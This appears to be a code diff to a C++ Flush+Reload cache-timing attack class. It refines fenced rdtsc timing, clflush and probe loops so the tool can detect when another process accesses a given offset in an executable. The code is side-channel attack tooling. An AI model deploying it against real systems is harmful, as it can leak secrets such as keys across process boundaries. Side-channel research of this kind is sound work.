@@ -46,11 +46,12 @@ unsigned int CTA::time() const {
 
 	asm volatile(
 			"mfence \n"
+			"lfence \n"
 			"rdtsc \n"
-			"mfence \n"
+			"lfence \n"
 			: "=a"(a), "=d"(d)
 			: 
-			:
+			: "ebx","ecx"
 		);
 
 	//rdtsc is a x86 instruction. To write the 64 bit
@@ -62,25 +63,24 @@ unsigned int CTA::time() const {
 
 void CTA::flush() const {
 
-	asm volatile("clflush (%0)\n"
+	asm volatile("mfence; lfence; clflush (%0); lfence\n"
 			:
 			: "r"(pimpl->addr)
-			:
 		);
 }
 
 void CTA::access() const {
 
-	asm volatile("movq (%0), %%rax\n"
+	asm volatile("mfence;lfence;movl (%0), %%eax; lfence\n"
 			:
 			: "r" (pimpl->addr)
-			: "rax");
+			: "eax");
 }
 
 unsigned int CTA::probe() const {
 
 	flush();
-	sched_yield(); //move this process to last in processr queue
+	sched_yield(); //move this process to last in processor queue
 	return time_operation();
 }
 
@@ -91,39 +91,36 @@ unsigned int CTA::time_operation() const {
 	return time() - begin;
 }
 
-bool CTA::was_accessed() const {
-
-	unsigned int t = probe();
-
-	return hit_begin <= t && t <= hit_end;
-}
-
 bool CTA::was_accessed(unsigned int timestamp) const {
 
 	return hit_begin <= timestamp && timestamp <= hit_end;
 }
 
-unsigned int CTA::wait_for_access() const {
+unsigned int CTA::wait_for_access(unsigned int& misses) const {
 
 	unsigned int time=0;
 
 	do{
-	
-		time=probe();
+		misses++;
+		flush();
+		sched_yield();
+		time = time_operation();
 
 	}while( !was_accessed(time) );
 
 	return time;
 }
 
-void CTA::call_when_offset_is_accessed(std::function<bool (unsigned int n_calls, void* addr)> func) const {
+void CTA::call_when_offset_is_accessed(std::function<bool (unsigned int n_calls, unsigned int misses)> func) const {
 	
 	unsigned int time = 0;
+	unsigned int misses = 0;
 
 	do{
-		time = wait_for_access();
-		
-	}while( func(time, pimpl->addr) );
+		misses=0;
+		time = wait_for_access(misses);
+	
+	}while( func(time, misses) );
 }
 
 CTA::CacheTimingAttack(const char* executable, unsigned int offset) :
